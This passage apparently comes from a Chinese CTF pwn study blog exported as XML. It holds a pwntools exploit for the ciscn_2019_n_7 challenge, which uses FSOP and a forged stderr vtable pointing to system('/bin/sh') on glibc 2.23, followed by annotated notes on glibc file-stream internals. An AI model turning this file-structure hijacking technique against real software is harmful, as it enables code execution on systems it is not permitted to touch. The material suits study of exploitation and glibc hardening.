not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="ciscn-2019-n-7"><a href="#ciscn-2019-n-7" class="headerlink" title="ciscn_2019_n_7"></a>ciscn_2019_n_7</h1><h2 id="版本-1"><a href="#版本-1" class="headerlink" title="版本"></a>版本</h2><p>glibc2.23</p>
<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>1.利用FSOP，通过更改_IO_list_all结构体，来改变进行文件流操作时的函数调用。</p>
<p>2.伪造_IO_FILE_plus使其一些成员满足一些特定条件来调用假的虚表中的函数。</p>
<h2 id="py-1"><a href="#py-1" class="headerlink" title="py"></a>py</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29483</span>)</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">io.sendafter(<span class="string">&quot;1.add page\n2.edit page\n3.show page\n4.exit\nYour choice-&gt; \n&quot;</span>,b<span class="number">&#x27;666&#x27;</span>)</span><br><span class="line"><span class="built_in">puts</span> = <span class="type">int</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span>).strip(),<span class="number">16</span>)</span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;puts&quot;</span>, <span class="built_in">puts</span>)</span><br><span class="line">base = <span class="built_in">puts</span> - obj.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">print(hex(base))</span><br><span class="line">print(hex(<span class="built_in">puts</span>))</span><br><span class="line">def add(size,name):</span><br><span class="line">    io.sendafter(<span class="string">&quot;1.add page\n2.edit page\n3.show page\n4.exit\nYour choice-&gt; \n&quot;</span>, b<span class="number">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;Input string Length: \n&quot;</span>,size)</span><br><span class="line">    io.sendafter(<span class="string">&quot;Author name:\n&quot;</span>,name)</span><br><span class="line">def edit(name,con):</span><br><span class="line">    io.sendafter(<span class="string">&quot;1.add page\n2.edit page\n3.show page\n4.exit\nYour choice-&gt; \n&quot;</span>, b<span class="number">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;New Author name:\n&quot;</span>,name)</span><br><span class="line">    io.sendafter(<span class="string">&quot;New contents:\n&quot;</span>,con)</span><br><span class="line">def <span class="built_in">exit</span>():</span><br><span class="line">    io.sendafter(<span class="string">&quot;1.add page\n2.edit page\n3.show page\n4.exit\nYour choice-&gt; \n&quot;</span>, b<span class="number">&#x27;4&#x27;</span>)</span><br><span class="line">_IO_2_1_stderr_=base+<span class="number">0x3c4540</span></span><br><span class="line">vtableadd =_IO_2_1_stderr_+<span class="number">216</span></span><br><span class="line">bss = base+<span class="number">0x3c3000</span>+<span class="number">0x2000</span></span><br><span class="line">bssbuf = base+<span class="number">0x3c3000</span>+<span class="number">0x2200</span></span><br><span class="line">sys = base + obj.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">add(b<span class="number">&#x27;152&#x27;</span>,<span class="number">8</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>)</span><br><span class="line">edit(<span class="number">8</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>+p64(vtableadd),p64(bss))</span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">edit(b<span class="number">&#x27;</span>aaaaaaaa<span class="number">&#x27;</span>+p64(bss),<span class="number">12</span>*p64(sys))</span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">payload = b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span>+<span class="number">4</span>*p64(<span class="number">0x0</span>)+p64(<span class="number">0x1</span>)+p64(<span class="number">0x2</span>)+<span class="number">2</span>*p64(<span class="number">0x0</span>)</span><br><span class="line">edit(b<span class="number">&#x27;</span>aaaaaaaa<span class="number">&#x27;</span>+p64(_IO_2_1_stderr_),payload)</span><br><span class="line"><span class="meta">#gdb.attach(io)</span></span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;1.add page\n2.edit page\n3.show page\n4.exit\nYour choice-&gt; \n&quot;</span>, b<span class="number">&#x27;</span>hh<span class="number">&#x27;</span>)</span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="疑难"><a href="#疑难" class="headerlink" title="疑难"></a>疑难</h2><p>本题有诸多待解决的问题，利用exit（）无法打通，感觉是因为在exit选项的时候标准输入和标准输出已关闭，但是感觉也可以通过重定向到stderr来解决，需要对文件流的函数执行流程有足够的理解才能完成此构造，未来有机会解决此问题。</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>IO</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>IO_FILE</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Advanced IO</title>
    <url>/2024/08/20/%E5%85%B3%E4%BA%8EIO%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="genops-c"><a href="#genops-c" class="headerlink" title="genops.c"></a>genops.c</h1><blockquote>
<p>其中定义了许多公共子函数，为具体跳表函数的实现提供基础功能</p>
</blockquote>
<h2 id="int-IO-switch-to-get-mode-FILE-fp"><a href="#int-IO-switch-to-get-mode-FILE-fp" class="headerlink" title="int _IO_switch_to_get_mode (FILE *fp)"></a><code>int _IO_switch_to_get_mode (FILE *fp)</code></h2><blockquote>
<p>此函数在同一个文件描述符变为get模式时可用，也就是准备从文件想缓冲区写入东西时可用</p>
</blockquote>
<h1 id="fileops-c"><a href="#fileops-c" class="headerlink" title="fileops.c"></a>fileops.c</h1><blockquote>
<p>跳表函数的核心实现</p>
</blockquote>
<h2 id="int-IO-new-file-overflow-FILE-f-int-ch"><a href="#int-IO-new-file-overflow-FILE-f-int-ch" class="headerlink" title="int _IO_new_file_overflow (FILE *f, int ch)"></a><code>int _IO_new_file_overflow (FILE *f, int ch)</code></h2><blockquote>
<p>此函数用于刷新和维护输出缓冲区</p>
<p>流程：</p>
<p>1.错误检查</p>
<p>2.从读切换到write，或第一次write都会进入此分支</p>
<p>​	2.1 若没有缓冲区，则设置缓冲区</p>
<p>​	2.2 backup的处理，目前还没学过</p>
<p>​	2.3 调整读写缓冲区指针，基本思想为：将writeptr与writebase更新为readptr，防止readbase和readptr有数据未读取完成；将writeend更新为bufend，尽可能利用缓冲区；将readptr，readbase，readend放到同一个位置。（感觉这操纵有点迷，自己想维护readbase到readptr之间的数据，后面又将他们放到同一个位置，这不前后矛盾吗，可能由于版本迭代之后逻辑比较混乱）</p>
<p>​	2.4 调整flag，置为最近putting过</p>
<p>​	2.5 不是宽字符并且是行缓冲或无缓冲就将写缓冲区的end设置为ptr（不知道什么功能会用上）</p>
<p>3.通过判断ch参数来决定函数功能</p>
<p>​	3.1 ch &#x3D; eof，就是刷新缓冲区，将writebase到writeptr中的数据写入文件之中</p>
<p>​	3.2 缓冲区满了之后刷新缓冲区，第一次调用是不会走到这一步的</p>
<p>​	3.3 &amp; 3.4 将ch放入到缓冲区，该刷新的时候刷新，一个字符一个字符判断</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">int_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/*错误检查*/</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">/*从读切换到write，或第一次write都会进入此分支*/</span></span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  ((_f)-&gt;_mode &lt;= 0							      \</span></span><br><span class="line"><span class="meta">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,				      \</span></span><br><span class="line"><span class="meta">		  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)		      \</span></span><br><span class="line"><span class="meta">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,		      \</span></span><br><span class="line"><span class="meta">		   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr			      \</span></span><br><span class="line"><span class="meta">		    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span><br></pre></td></tr></table></figure>

<h2 id="static-size-t-new-do-write-FILE-fp-const-char-data-size-t-to-do"><a href="#static-size-t-new-do-write-FILE-fp-const-char-data-size-t-to-do" class="headerlink" title="static size_t new_do_write (FILE *fp, const char *data, size_t to_do)"></a><code>static size_t new_do_write (FILE *fp, const char *data, size_t to_do)</code></h2><blockquote>
<p>1.通过判断readend和writebase来判断读操作是否成功，若不成功调整文件偏移，使写操作在正确位置。<br>2.调整_cur_column，格式化所需要，目前知道干什么的就行<br>3.更新写缓冲区的位置为整个缓冲区大小或0</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">注意：int</span></span><br><span class="line"><span class="comment">_IO_new_do_write (FILE *fp, const char *data, size_t to_do)</span></span><br><span class="line"><span class="comment">此函数使上述函数的核心实现，上述函数仅仅做了一个封装，成功返回0，不成功返回EOF</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="size-t-IO-default-xsputn-FILE-f-const-void-data-size-t-n"><a href="#size-t-IO-default-xsputn-FILE-f-const-void-data-size-t-n" class="headerlink" title="size_t _IO_default_xsputn (FILE *f, const void *data, size_t n)"></a><code>size_t _IO_default_xsputn (FILE *f, const void *data, size_t n)</code></h2><blockquote>
<p>此函数用于读取不足一个缓冲区的字符向文件中，但是需要考虑行缓冲无缓冲等情况需要封装一个函数来进行</p>
<p>1.缓冲区不够直接通过overflow的方式直接传递，直接就需要考虑缓冲区刷新问题</p>
<p>2.缓冲区足够，先填满缓冲区，多出来的第一个按1的方式处理。</p>
<p>在f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end，若填不满缓冲区不会刷新，（这就是c语言说的缓冲区刷新时机的原理）</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_default_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">	    count = more;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">	      s += count;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">	      <span class="type">ssize_t</span> i;</span><br><span class="line">	      <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">		*p++ = *s++;</span><br><span class="line">	      f-&gt;_IO_write_ptr = p;</span><br><span class="line">	    &#125;</span><br><span class="line">	  more -= count;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>IO</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>IO_FILE</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>关于IO_FILE的学习</title>
    <url>/2024/08/11/%E5%85%B3%E4%BA%8EIO-FILE%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="一些重要结构体和宏的定义"><a href="#一些重要结构体和宏的定义" class="headerlink" title="一些重要结构体和宏的定义"></a>一些重要结构体和宏的定义</h1><blockquote>
<p>一般放在头文件</p>
</blockquote>
<h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a><code>_IO_FILE</code></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">    <span class="comment">/*备份和回退操作*/</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"><span class="comment">/*标记所用*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"><span class="comment">/*IO CHAIN利用的关键点*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;<span class="comment">/*文件描述符*/</span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//补充说明</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* A streammarker remembers a position in a buffer. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">next</span>;</span></span><br><span class="line">  FILE *_sbuf;</span><br><span class="line">  <span class="comment">/* If _pos &gt;= 0</span></span><br><span class="line"><span class="comment"> it points to _buf-&gt;Gbase()+_pos. FIXME comment */</span></span><br><span class="line">  <span class="comment">/* if _pos &lt; 0, it points to _buf-&gt;eBptr()+_pos. FIXME comment */</span></span><br><span class="line">  <span class="type">int</span> _pos;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a><code>flag</code></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Magic number and bits for the _flags field.  The magic number is</span></span><br><span class="line"><span class="comment">   mostly vestigial, but preserved for compatibility.  It occupies the</span></span><br><span class="line"><span class="comment">   high 16 bits of _flags; the low 16 bits are actual flag bits.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC         0xFBAD0000 <span class="comment">/* Magic number 验证file结构体的有效性*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK    0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF          0x0001 <span class="comment">/* Don&#x27;t deallocate buffer on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED        0x0002</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_READS          0x0004 <span class="comment">/* Reading not allowed.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES         0x0008 <span class="comment">/* Writing not allowed.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN          0x0010</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN          0x0020</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x0040 <span class="comment">/* Don&#x27;t call close(_fileno) on close.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINKED            0x0080 <span class="comment">/* In the list of all open files.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP         0x0100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF          0x0200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET      0x0400 <span class="comment">/* Put and get pointer move in unison.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING      0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF        0x2000</span></span><br><span class="line">                           <span class="comment">/* 0x4000  No longer used, reserved for compat.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK         0x8000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bits for the _flags2 field.  特殊扩展*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_MMAP 1 <span class="comment">/*如：mmap函数*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_NOTCANCEL 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_USER_WBUF 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_NOCLOSE 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_CLOEXEC 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_NEED_LOCK 128</span></span><br></pre></td></tr></table></figure>



<h2 id="struct-IO-FILE-plus"><a href="#struct-IO-FILE-plus" class="headerlink" title="struct _IO_FILE_plus"></a><code>struct _IO_FILE_plus</code></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

